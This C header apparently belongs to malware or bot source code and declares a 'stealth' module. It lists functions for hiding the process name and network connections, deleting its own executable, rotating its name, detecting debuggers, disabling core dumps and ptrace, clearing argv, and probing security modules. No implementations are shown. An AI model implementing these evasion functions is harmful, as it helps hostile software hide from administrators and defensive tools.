#pragma once

#include <sys/socket.h>
#include <netinet/in.h>
#include "includes.h"  

void stealth_init(void);
void stealth_hide_process_name(void);
void stealth_unlink_exe(void);
void stealth_rotate_name(void);
void stealth_cleanup(void);

BOOL stealth_is_hidden_process(const char *exe_path, const char *cmdline);
BOOL stealth_has_mismatch(const char *exe_path, const char *cmdline);
BOOL stealth_check_debugger(void);

void stealth_hide_network(void);
BOOL stealth_should_hide_connection(struct sockaddr_in *addr);

void stealth_disable_core_dumps(void);
void stealth_disable_ptrace(void);
void stealth_clear_argv(int argc, char **argv);

void stealth_check_security_modules(void);
